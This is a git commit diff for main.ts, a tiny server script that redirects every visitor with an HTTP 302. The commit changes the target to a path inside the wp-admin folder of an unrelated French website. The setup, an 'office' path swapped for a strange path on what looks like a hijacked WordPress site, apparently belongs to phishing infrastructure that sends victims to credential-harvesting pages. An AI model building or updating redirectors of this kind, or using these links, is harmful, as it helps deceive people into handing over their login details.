89c4e51d1b6d3472a040ba2f4226b980405ca7b9
Digital2025001 <bosmichael30@gmail.com>
2025-09-16 15:25:13 -0700

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://the-learning-project.foundation/prive/office/", // Replace this with your actual link
+      Location: "https://mathieu-mariac-smartcover.comhit.fr/wp-admin/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
